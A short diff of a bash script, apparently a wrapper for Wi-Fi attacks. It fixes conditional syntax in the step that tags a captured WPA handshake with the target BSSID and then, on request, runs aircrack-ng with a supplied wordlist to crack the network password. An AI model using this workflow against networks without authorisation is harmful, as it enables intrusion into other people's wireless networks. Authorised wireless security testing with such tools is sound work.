@@ -75,10 +75,10 @@ echo "[DONE] Catching handshake"
 echo "[INFO] Tagging Handshake ..."
 mv handshake-01.cap $target-handshake.cap
 
-if ["$cancrack" = "y"];
+if [ "$cancrack" == "y" ]; then
     echo "Start cracking now ? (y/N)"
     read cracknow
-    if ["$cracknow" = "y"]; then
+    if [ "$cracknow" == "y" ]; then
         echo "[INFO] Start cracking"
 	echo "[WARNING] If you do not have a valid Handshake, you need to reexec airodump-ng until you get it!"
 	aircrack-ng -w $2 -b $target $target-handshake.cap
